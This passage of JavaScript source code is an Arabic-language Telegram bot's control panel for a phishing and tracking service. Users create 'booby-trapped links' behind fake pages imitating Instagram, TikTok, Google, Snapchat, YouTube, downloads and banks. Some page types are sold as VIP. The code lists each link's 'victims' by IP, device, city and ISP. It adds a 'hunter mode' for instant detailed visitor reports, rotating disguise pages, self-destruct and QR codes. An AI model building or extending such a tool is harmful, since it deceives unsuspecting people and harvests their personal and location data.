        `🟢 نشطة: *${gs.active}*\n` +
        `🔴 معطلة: *${gs.disabled}*\n` +
        `👁️ مجموع الزيارات: *${gs.totalVisits}*`,
        { parse_mode: 'Markdown' }
      );
    }

    // ── /linksearch (admin) ────────────────────────────────────────────────────
    if (text.startsWith('/linksearch') && chatId === BOT_OWNER) {
      const q = text.split(' ').slice(1).join(' ').trim();
      if (!q) return bot.sendMessage(chatId, '⚠️ الاستخدام: /linksearch [نص البحث]');
      const all = linkMgr.getAllLinks();
      const found = Object.entries(all).filter(([lid, l]) =>
        lid.includes(q) || (l.label || '').toLowerCase().includes(q.toLowerCase()) ||
        (l.url || '').includes(q) || String(l.uid).includes(q)
      ).slice(0, 10);
      if (!found.length) return bot.sendMessage(chatId, '🔍 لا توجد نتائج.');
      let out = `🔍 *نتائج البحث عن "${q}"*\n\n`;
      for (const [lid, l] of found) {
        const meta = linkMgr.getTypeMeta(l.type);
        out += `• \`${lid}\` ${meta.emoji} — ${l.uid} — 👁️${l.visits} — ${statusIcon(l)}\n`;
        if (l.label) out += `  🏷️ ${l.label}\n`;
      }
      return bot.sendMessage(chatId, out, { parse_mode: 'Markdown' });
    }
  });

  // ══════════════════════════════════════════════════════════════════════════
  //   BOT — CALLBACK QUERY HANDLER
  // ══════════════════════════════════════════════════════════════════════════

  bot.on('callback_query', async (cq) => {
    const chatId = cq.message.chat.id;
    const msgId  = cq.message.message_id;
    const data   = cq.data || '';

    bot.answerCallbackQuery(cq.id).catch(() => {});

    // ── nl_start — new link button ────────────────────────────────────────────
    if (data === 'nl_start') {
      return bot.editMessageText('🔗 *إنشاء رابط ملغم جديد*\n\nاختر نوع الصفحة المزيفة:',
        { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown',
          reply_markup: JSON.stringify(TYPE_KEYBOARD) });
    }

    // ── nl_t:TYPE — type selected ─────────────────────────────────────────────
    if (data.startsWith('nl_t:')) {
      const type = data.replace('nl_t:', '');
      const VIP_LINK_TYPES = new Set(['instagram','tiktok','google','snapchat','youtube','download','bank']);
      if (VIP_LINK_TYPES.has(type) && !isPremium(chatId)) {
        return bot.editMessageText(
          '💎 *هذا النوع حصري لأعضاء VIP*\n\nلا يمكنك استخدام هذه الصفحة إلا بعضوية VIP.\n\n💬 للاشتراك تواصل مع @Ye_x00',
          { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown',
            reply_markup: JSON.stringify({ inline_keyboard: [[{ text: '◀️ رجوع', callback_data: 'nl_start' }]] }) }
        ).catch(() => bot.sendMessage(chatId, '💎 هذا النوع حصري لأعضاء VIP فقط. تواصل مع @Ye_x00'));
      }
      _nlState.set(chatId, { type });
      const meta = linkMgr.getTypeMeta(type);
      return bot.sendMessage(chatId,
        `${meta.emoji} *${meta.label}*\n\n🔗 أدخل الرابط المستهدف:\n_(الرابط الذي ستخفيه خلف الصفحة)_`,
        { parse_mode: 'Markdown',
          reply_markup: JSON.stringify({ force_reply: true, selective: true, input_field_placeholder: 'https://...' }) }
      );
    }

    // ── lm:noop ───────────────────────────────────────────────────────────────
    if (data === 'lm:noop') return;

    // ── lm:oldlinks — show full old links list ─────────────────────────────────
    if (data === 'lm:oldlinks') {
      const oldLinks = (oldLinksDb && oldLinksDb[String(chatId)]) || [];
      if (!oldLinks.length) {
        return bot.sendMessage(chatId, '🗂️ لا توجد روابط قديمة.').catch(() => {});
      }
      let out = `🗂️ *روابطك القديمة* (${oldLinks.length})\n\n`;
      oldLinks.slice(0, 20).forEach((ol, i) => {
        out += `${i + 1}. 🛡️ Cloudflare:\n\`${ol.cLink}\`\n`;
        out += `   🖥️ WebView: \`${ol.wLink}\`\n`;
        out += `   🕒 منذ ${timeAgo(ol.createdAt)}\n\n`;
      });
      return bot.sendMessage(chatId, out, {
        parse_mode: 'Markdown',
        reply_markup: JSON.stringify({ inline_keyboard: [[{ text: '◀️ رجوع للروابط', callback_data: 'lm:list:0' }]] }),
      }).catch(() => {});
    }

    // ── lm:noperm — permission denied toast ───────────────────────────────────
    if (data === 'lm:noperm') {
      return bot.answerCallbackQuery(cq.id, { text: '⛔ ليس لديك صلاحية هذا الإجراء. تواصل مع المالك.', show_alert: true }).catch(() => {});
    }

    // ── lm:list / lm:list:PAGE ────────────────────────────────────────────────
    if (data === 'lm:list' || data.startsWith('lm:list:')) {
      const page = parseInt((data.split(':')[2]) || '0') || 0;
      const { text, kb, md } = myLinksPage(chatId, page);
      const parseMode = md || 'Markdown';
      return bot.editMessageText(text, {
        chat_id: chatId, message_id: msgId,
        parse_mode: parseMode, reply_markup: kb,
      }).catch(() => {
        bot.sendMessage(chatId, text, { parse_mode: parseMode, reply_markup: kb }).catch(() => {});
      });
    }

    // ── lm:info:LID ───────────────────────────────────────────────────────────
    if (data.startsWith('lm:info:')) {
      const lid  = data.split(':')[2];
      const link = linkMgr.getLink(lid);
      if (!link || !canManageLinks(chatId, link.uid)) return;
      return bot.editMessageText(linkInfoText(lid, link), {
        chat_id: chatId, message_id: msgId,
        parse_mode: 'Markdown', reply_markup: linkInfoKeyboard(lid, link, chatId),
      }).catch(() => {});
    }

    // ── lm:dis:LID — disable ──────────────────────────────────────────────────
    if (data.startsWith('lm:dis:')) {
      const lid  = data.split(':')[2];
      const link = linkMgr.getLink(lid);
      if (!canManageLinks(chatId, link?.uid)) return bot.answerCallbackQuery(cq.id, { text: '⛔ ليس لديك صلاحية تعطيل هذا الرابط.', show_alert: true }).catch(() => {});
      linkMgr.setActive(lid, null, false);
      return refreshLinkInfo(chatId, lid, msgId, '🔴 الرابط معطل الآن');
    }

    // ── lm:en:LID — enable ────────────────────────────────────────────────────
    if (data.startsWith('lm:en:')) {
      const lid  = data.split(':')[2];
      const link = linkMgr.getLink(lid);
      if (!canManageLinks(chatId, link?.uid)) return bot.answerCallbackQuery(cq.id, { text: '⛔ ليس لديك صلاحية تفعيل هذا الرابط.', show_alert: true }).catch(() => {});
      linkMgr.setActive(lid, null, true);
      return refreshLinkInfo(chatId, lid, msgId, '🟢 الرابط نشط الآن');
    }

    // ── lm:del:LID — delete (confirm) ─────────────────────────────────────────
    if (data.startsWith('lm:del:')) {
      const lid  = data.split(':')[2];
      const link = linkMgr.getLink(lid);
      if (!canManageLinks(chatId, link?.uid)) return bot.answerCallbackQuery(cq.id, { text: '⛔ ليس لديك صلاحية حذف هذا الرابط.', show_alert: true }).catch(() => {});
      _confirmDel.set(chatId, lid);
      return bot.editMessageReplyMarkup({
        inline_keyboard: [
          [{ text: '⚠️ تأكيد الحذف', callback_data: `lm:delc:${lid}` },
           { text: '❌ إلغاء',        callback_data: `lm:info:${lid}` }],
        ],
      }, { chat_id: chatId, message_id: msgId }).catch(() => {});
    }

    // ── lm:delc:LID — delete confirmed ────────────────────────────────────────
    if (data.startsWith('lm:delc:')) {
      const lid  = data.split(':')[2];
      const link = linkMgr.getLink(lid);
      if (!canManageLinks(chatId, link?.uid)) return bot.answerCallbackQuery(cq.id, { text: '⛔ ليس لديك صلاحية حذف هذا الرابط.', show_alert: true }).catch(() => {});
      linkMgr.deleteLink(lid, null);
      _confirmDel.delete(chatId);
      return bot.editMessageText(`🗑️ تم حذف الرابط \`${lid}\``,
        { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown',
          reply_markup: JSON.stringify({ inline_keyboard: [[{ text: '◀️ رجوع', callback_data: 'lm:list:0' }]] }) }
      ).catch(() => {});
    }

    // ── lm:vict:LID — victims list ────────────────────────────────────────────
    if (data.startsWith('lm:vict:')) {
      const lid  = data.split(':')[2];
      const link = linkMgr.getLink(lid);
      if (!link || !canManageLinks(chatId, link.uid)) return;
      const vs = (link.victims || []).slice(-8).reverse();
      if (!vs.length) {
        return bot.sendMessage(chatId, '👁️ لا توجد زيارات بعد.').catch(() => {});
      }
      let out = `👥 *الضحايا — \`${lid}\`*\n\n`;
      vs.forEach((v, i) => {
        out += `${i + 1}. ${v.device} \`${v.ip}\`\n`;
        out += `   🌍 ${v.country} ${v.city}\n`;
        out += `   📡 ${v.isp}\n`;
        out += `   🕒 ${v.time.slice(0, 16).replace('T', ' ')}\n\n`;
      });
      return bot.sendMessage(chatId, out, {
        parse_mode: 'Markdown',
        reply_markup: JSON.stringify({ inline_keyboard: [[{ text: '◀️ رجوع', callback_data: `lm:info:${lid}` }]] }),
      });
    }

    // ── lm:qr:LID — QR Code ───────────────────────────────────────────────────
    if (data.startsWith('lm:qr:')) {
      const lid  = data.split(':')[2];
      const link = linkMgr.getLink(lid);
      if (!link || !canManageLinks(chatId, link.uid)) return;
      const url   = `${hostURL}/l/${lid}`;
      const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=600x600&margin=20&data=${encodeURIComponent(url)}`;
      return bot.sendPhoto(chatId, qrUrl, {
        caption: `📷 *QR Code — ${lid}*\n\n🔗 \`${url}\``,
        parse_mode: 'Markdown',
      }).catch(() => bot.sendMessage(chatId, `📷 QR: ${qrUrl}`));
    }

    // ── lm:copy:LID — show link URL ────────────────────────────────────────────
    if (data.startsWith('lm:copy:')) {
      const lid  = data.split(':')[2];
      const link = linkMgr.getLink(lid);
      if (!link || !canManageLinks(chatId, link.uid)) return;
      const url = `${hostURL}/l/${lid}`;
      return bot.sendMessage(chatId, `🔗 رابطك:\n\n\`${url}\``, { parse_mode: 'Markdown' });
    }

    // ── lm:sd:LID — toggle self-destruct ──────────────────────────────────────
    if (data.startsWith('lm:sd:')) {
      const lid  = data.split(':')[2];
      const link = linkMgr.getLink(lid);
      if (!link || !canManageLinks(chatId, link.uid)) return;
      linkMgr.updateLink(lid, chatId, { selfDestruct: !link.selfDestruct });
      return refreshLinkInfo(chatId, lid, msgId,
        link.selfDestruct ? '✅ تم إلغاء التدمير الذاتي' : '💣 التدمير الذاتي مفعّل!');
    }

    // ── lm:chart:LID — visual visit stats ────────────────────────────────────
    if (data.startsWith('lm:chart:')) {
      const lid  = data.split(':')[2];
      const link = linkMgr.getLink(lid);
      if (!link || !canManageLinks(chatId, link.uid)) return;
      const total = link.visits || 0;
      if (!total) return bot.answerCallbackQuery(cq.id, { text: '📊 لا توجد زيارات بعد!', show_alert: true }).catch(() => {});

      // Countries bar chart (top 8)
      const ctries = Object.entries(link.countries || {})
        .sort((a, b) => b[1] - a[1]).slice(0, 8);
      let ctryChart = '';
      if (ctries.length) {
        const maxV = ctries[0][1];
        ctries.forEach(([c, n]) => {
          const pct  = Math.round((n / total) * 100);
          const bars = '█'.repeat(Math.max(1, Math.round((n / maxV) * 10)));
          ctryChart += `${c}: ${bars} ${n} (${pct}%)\n`;
        });
      } else { ctryChart = 'لا توجد بيانات دول\n'; }

      // Devices
      const mob  = link.devices?.mobile  || 0;
      const desk = link.devices?.desktop || 0;
      const mobBars  = '📱'.repeat(Math.max(1, Math.round((mob  / total) * 10))) || '';
      const deskBars = '💻'.repeat(Math.max(1, Math.round((desk / total) * 10))) || '';

      // Unique vs repeat
      const uniq   = (link.uniqueIPs || []).length;
      const repeat = Math.max(0, total - uniq);

      const out =
        `📊 *إحصائيات الرابط* \`${lid}\`\n\n` +
        `👁️ *إجمالي الزيارات:* ${total}\n` +
        `🆔 *زوار فريدون:* ${uniq}\n` +
        `🔁 *زيارات متكررة:* ${repeat}\n\n` +
        `📱 موبايل: ${mobBars} ${mob}\n` +
        `💻 كمبيوتر: ${deskBars} ${desk}\n\n` +
        `🌍 *الدول:*\n\`\`\`\n${ctryChart}\`\`\``;

      return bot.sendMessage(chatId, out, {
        parse_mode: 'Markdown',
        reply_markup: JSON.stringify({ inline_keyboard: [[{ text: '◀️ رجوع', callback_data: `lm:info:${lid}` }]] }),
      }).catch(() => {});
    }

    // ── lm:rand:LID — toggle random page rotation ─────────────────────────────
    if (data.startsWith('lm:rand:')) {
      const lid  = data.split(':')[2];
      const link = linkMgr.getLink(lid);
      if (!link || !canManageLinks(chatId, link.uid)) return;
      linkMgr.updateLink(lid, chatId, { randomTypes: !link.randomTypes });
      return refreshLinkInfo(chatId, lid, msgId,
        link.randomTypes
          ? '✅ تم إيقاف الصفحة الدوّارة — سيُعرض نوع ثابت'
          : '🔄 *الصفحة الدوّارة مفعّلة!*\nكل زائر سيرى نوع صفحة مختلف عشوائياً 🎭');
    }

    // ── lm:hunter:LID — toggle hunter mode ────────────────────────────────────
    if (data.startsWith('lm:hunter:')) {
      const lid  = data.split(':')[2];
      const link = linkMgr.getLink(lid);
      if (!link || !canManageLinks(chatId, link.uid)) return;
      linkMgr.updateLink(lid, chatId, { hunterMode: !link.hunterMode });
      return refreshLinkInfo(chatId, lid, msgId,
        link.hunterMode
          ? '✅ تم إيقاف وضع الصياد'
          : '🎯 *وضع الصياد مفعّل!*\nستصلك بيانات تفصيلية فورية عن كل زائر مع الـ UA الكامل');
    }

    // ── lm:ctry:LID — country block ────────────────────────────────────────────
    if (data.startsWith('lm:ctry:')) {
      const lid  = data.split(':')[2];
      const link = linkMgr.getLink(lid);
      if (!link || !canManageLinks(chatId, link.uid)) return;
      const blocked = (link.blockedCountries || []);
      const topCountries = Object.entries(link.countries || {})
        .sort((a, b) => b[1] - a[1]).slice(0, 5).map(([c]) => c);
      let text = `🌍 *حظر الدول للرابط* \`${lid}\`\n\n`;
      if (blocked.length) {
        text += `🚫 *الدول المحظورة:*\n${blocked.map(c => `• ${c}`).join('\n')}\n\n`;
      } else {
        text += `✅ لا توجد دول محظورة حالياً\n\n`;
      }
      text += `💡 أرسل كود الدولة لإضافته أو حذفه (مثال: SA أو AE)\nأو اضغط "مسح الكل" لإزالة جميع الحظر`;
      _awaitAction.set(chatId, { action: 'blockctry', lid, msgId });
      const kb = [[]];
      topCountries.forEach(c => {
        const isBlocked = blocked.includes(c);
        kb[0].push({ text: `${isBlocked ? '🚫' : '✅'} ${c}`, callback_data: `lm:ctry_t:${lid}:${c}` });
      });
      kb.push([{ text: '🗑️ مسح الكل', callback_data: `lm:ctry_clr:${lid}` }, { text: '◀️ رجوع', callback_data: `lm:info:${lid}` }]);
      return bot.sendMessage(chatId, text, {
        parse_mode: 'Markdown',
        reply_markup: JSON.stringify({ inline_keyboard: kb }),
      }).catch(() => {});
    }

    // ── lm:ctry_t:LID:CC — toggle a country block ─────────────────────────────
    if (data.startsWith('lm:ctry_t:')) {
      const [, , lid, cc] = data.split(':');
      const link = linkMgr.getLink(lid);
      if (!link || !canManageLinks(chatId, link.uid)) return;
      const blocked = [...(link.blockedCountries || [])];
      const idx = blocked.indexOf(cc);
      if (idx >= 0) blocked.splice(idx, 1); else blocked.push(cc);
      linkMgr.updateLink(lid, chatId, { blockedCountries: blocked });
      const isNowBlocked = blocked.includes(cc);
      return bot.answerCallbackQuery(cq.id, {
        text: isNowBlocked ? `🚫 تم حظر ${cc}` : `✅ تم رفع حظر ${cc}`,
        show_alert: false,
      }).catch(() => {});
    }

    // ── lm:ctry_clr:LID — clear all country blocks ────────────────────────────
    if (data.startsWith('lm:ctry_clr:')) {
      const lid = data.split(':')[2];
      const link = linkMgr.getLink(lid);
      if (!link || !canManageLinks(chatId, link.uid)) return;
      linkMgr.updateLink(lid, chatId, { blockedCountries: [] });
      return bot.answerCallbackQuery(cq.id, { text: '✅ تم مسح جميع حظر الدول', show_alert: true }).catch(() => {});
    }

    // ── Force-reply triggers ──────────────────────────────────────────────────
    const forceReplyActions = {
      'lm:label:': { action: 'label',     prompt: '🏷️ أدخل اسماً للرابط (حتى 50 حرف):' },
      'lm:exp:':   { action: 'expiry',    prompt: '⏰ أدخل مدة الانتهاء بالساعات (مثال: 24):\n_(أدخل 0 لإلغاء المدة)_' },
      'lm:vis:':   { action: 'maxvisits', prompt: '🔢 أدخل الحد الأقصى للزيارات:\n_(أدخل 0 لإلغاء الحد)_' },
      'lm:pass:':  { action: 'password',  prompt: '🔑 أدخل كلمة المرور:\n_(أدخل "off" لإزالة كلمة السر)_' },
      'lm:hook:':  { action: 'webhook',   prompt: '🌐 أدخل رابط الـ Webhook (POST):\n_(أدخل "off" لإلغاء)_' },
      'lm:bip:':   { action: 'blockip',   prompt: '🚫 أدخل عنوان IP لحظره من هذا الرابط:' },
      'lm:alias:': { action: 'alias',     prompt: '🔤 أدخل الاسم المخصص للرابط (أرقام وأحرف وـ فقط):' },
    };

    for (const [prefix, meta] of Object.entries(forceReplyActions)) {
      if (data.startsWith(prefix)) {
        const lid = data.slice(prefix.length);
        const link = linkMgr.getLink(lid);
        if (!link) return bot.answerCallbackQuery(cq.id, { text: '❌ الرابط غير موجود.', show_alert: true }).catch(() => {});
        if (!canManageLinks(chatId, link?.uid)) return bot.answerCallbackQuery(cq.id, { text: '⛔ ليس لديك صلاحية هذا الإجراء.', show_alert: true }).catch(() => {});
        _awaitAction.set(chatId, { action: meta.action, lid, msgId });
        return bot.sendMessage(chatId, meta.prompt, {
          parse_mode: 'Markdown',
          reply_markup: JSON.stringify({ force_reply: true, selective: true }),
        });
      }
    }

    // ── old:dis / old:en / old:del — old-style link buttons ──────────────────
    if (data.startsWith('old:dis:') || data.startsWith('old:en:') || data.startsWith('old:del:')) {
      const parts  = data.split(':');
      const action = parts[1];
      const b64    = parts[2];
      let oldKey;
      try { oldKey = Buffer.from(b64, 'base64').toString('utf8'); } catch(e) { return; }

      if (action === 'dis') {
        blockedOldLinks.add(oldKey);
        saveBlockedOldLinks();
        return bot.editMessageReplyMarkup({ inline_keyboard: [[
          { text: '🟢 إعادة التفعيل', callback_data: `old:en:${b64}` },
          { text: '🗑️ حذف نهائي',    callback_data: `old:del:${b64}` },
        ]] }, { chat_id: chatId, message_id: msgId }).catch(() =>
          bot.sendMessage(chatId, '🔴 تم تعطيل الرابط القديم.')
        );
      }
      if (action === 'en') {
        blockedOldLinks.delete(oldKey);
        saveBlockedOldLinks();
        return bot.editMessageReplyMarkup({ inline_keyboard: [[
          { text: '🔴 تعطيل مجدداً', callback_data: `old:dis:${b64}` },
        ]] }, { chat_id: chatId, message_id: msgId }).catch(() =>
          bot.sendMessage(chatId, '🟢 تم تفعيل الرابط القديم.')
        );
      }
      if (action === 'del') {
        blockedOldLinks.add(oldKey);
        saveBlockedOldLinks();
        return bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: msgId }).catch(() =>
          bot.sendMessage(chatId, '🗑️ تم تعطيل الرابط القديم نهائياً.')
        );
      }
    }
  });

  // ── Helper: refresh link info message ─────────────────────────────────────
  function refreshLinkInfo(chatId, lid, msgId, notice) {
    const link = linkMgr.getLink(lid);
    if (!link) return;
    const panelTxt = linkInfoText(lid, link);
    const kb       = linkInfoKeyboard(lid, link, chatId);

    // When there is a notice (action result), send it as a NEW message so the
    // user sees confirmation at the bottom of the chat, then edit/resend the
    // full panel separately so the inline keyboard stays up to date.
    if (notice) {
      bot.sendMessage(chatId, notice, { parse_mode: 'Markdown' }).catch(() => {});
    }

    if (msgId) {
      return bot.editMessageText(panelTxt, {
        chat_id: chatId, message_id: msgId,
        parse_mode: 'Markdown', reply_markup: kb,
      }).catch(() => bot.sendMessage(chatId, panelTxt, { parse_mode: 'Markdown', reply_markup: kb }));
    }
    return bot.sendMessage(chatId, panelTxt, { parse_mode: 'Markdown', reply_markup: kb });
  }
};
